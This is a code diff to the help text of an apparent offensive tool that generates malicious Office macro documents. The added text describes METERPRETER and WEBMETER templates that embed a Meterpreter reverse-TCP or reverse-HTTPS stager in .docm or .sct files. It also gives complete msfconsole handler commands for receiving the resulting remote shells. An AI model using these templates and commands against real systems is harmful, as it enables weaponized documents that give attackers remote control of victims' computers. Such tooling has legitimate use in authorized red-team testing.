@@ -72,14 +72,36 @@ r"""
          -> Example: echo <ip> <port> | %s -t METERPRETER -o -G meter.docm 
          
         Recommended msfconsole options (use exploit/multi/handler):
-        set PAYLOAD windows/meterpreter/reverse_tcp
-        set AutoRunScript post/windows/manage/smart_migrate
+        set PAYLOAD windows/meterpreter/reverse_tcp (32 bit)
+        set PAYLOAD windows/x64/meterpreter/reverse_tcp (64 bit
+        set LHOST 0.0.0.0
+        sel LPORT <port>
+        set AutoRunScript post/windows/manage/migrate
         set EXITFUNC thread
         set EnableUnicodeEncoding true
         set EnableStageEncoding true
         set ExitOnSession false
+        exploit -j
         
-        Warning: This will crash Office if Office 64bit is installed!
+                        --------------------  
+                          
+        WEBMETER  
+        Meterpreter reverse https template using VbsMeter by Cn33liz.
+        This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw
+        Give this template the IP and PORT of listening mfsconsole
+         -> Example: echo <ip> 443 | %s -t WEBMETER -o -G meter.sct 
+         
+        Recommended msfconsole options (use exploit/multi/handler):
+        set PAYLOAD windows/meterpreter/reverse_https (32 bit)
+        set PAYLOAD windows/x64/meterpreter/reverse_https (64 bit
+        set LHOST <attacker ip, cannot be 0.0.0.0>
+        set LPORT <port>
+        set AutoRunScript post/windows/manage/migrate
+        set EXITFUNC thread
+        set EnableUnicodeEncoding true
+        set EnableStageEncoding true
+        set ExitOnSession false
+        exploit -j
         
                 --------------------  
         
@@ -92,7 +114,7 @@ r"""
          -> Example2: echo "path\\to\my_exe.exe" "D:\\another\path\your_exe.exe" | %s  -t EMBED_EXE -o -G my_exe.xlsm
 
                 --------------------  
-""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp)
+""" % (currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp,currentApp, currentApp)
     print(templatesInfo)
     
     
